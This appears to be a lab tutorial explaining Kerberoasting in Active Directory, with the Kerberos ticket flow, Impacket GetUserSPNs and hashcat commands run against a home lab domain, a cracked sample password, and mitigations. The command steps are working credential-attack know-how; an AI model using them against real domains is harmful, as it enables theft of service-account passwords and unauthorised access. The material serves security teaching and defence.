## Introduction
Kerberoasting can be an effective method for extracting service account credentials from Active Directory as a regular user without sending any packets to the target system.
This attack is effective since people tend to create poor passwords.
![[AD_post21.png]]

## Kerberos in a nutshell:
1. When a user logs on to Active Directory, the user authenticates to the Domain Controller (DC) using the user’s password which of course the DC knows.
2. The DC sends the user a Ticket Granting Ticket (TGT) Kerberos ticket. The TGT is presented to any DC to prove authentication for Kerberos service tickets.
3. The user opens up Skype which causes the user’s workstation to lookup the Service Principal Name (SPN) for the user’s Exchange server.
4. Once the SPN is identified, the computer communicates with a DC again and presents the user’s TGT as well as the SPN for the resource to which the user needs to communicate.
5. The DC replies with the Ticket Granting Service (TGS) Kerberos service ticket.
6. The user’s workstation presents the TGS to the Exchange server for access.
7. Skype connects successfully.

## What is a Kerberoasting attack?
- Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (“SPN”).
- In such an attack, an authenticated domain user requests a Kerberos ticket for an SPN. The retrieved Kerberos ticket is encrypted with the hash of the service account password affiliated with the SPN. (An SPN is an attribute that ties a service to a user account within the AD). The adversary then works offline to crack the password hash, often using brute force techniques
- Once the plaintext credentials of the service account are obtained, the adversary can impersonate the account owner and inherit access to any systems, assets or networks granted to the compromised account.

## How to do it?

1. Once you have admin/standard user access, look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket.

```python
GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
```

![[AD_post22.png]]

2. Now once you have the TGS hash, all we need to do is to feed the hash to Hashcat tool.
![[AD_post23.png]]

## Practical implementation of kerberoasting
1. Once you have admin/standard user access, look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket.
```python
sudo GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.1.15 -request
```

![[AD_post24.png]]

2. Cracking the above hash with hashcat:
```python
sudo hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force
```

password --> MyPassword123#

## Mitigations:
- If possible use [group managed service accounts](https://technet.microsoft.com/en-us/library/hh831782%28v=ws.11%29.aspx?f=255&MSPPError=-2147217396) which have random, complex passwords (>100 characters) and are managed automatically by Active Directory.
- Ensure all service accounts (user accounts with Service Principal Names) have long, complex passwords greater than 25 characters, preferably 30 or more. This makes cracking these password far more difficult.
- Service Accounts with elevated AD permissions should be the focus on ensuring they have long, complex passwords.
- Ensure all Service Account passwords are changed regularly.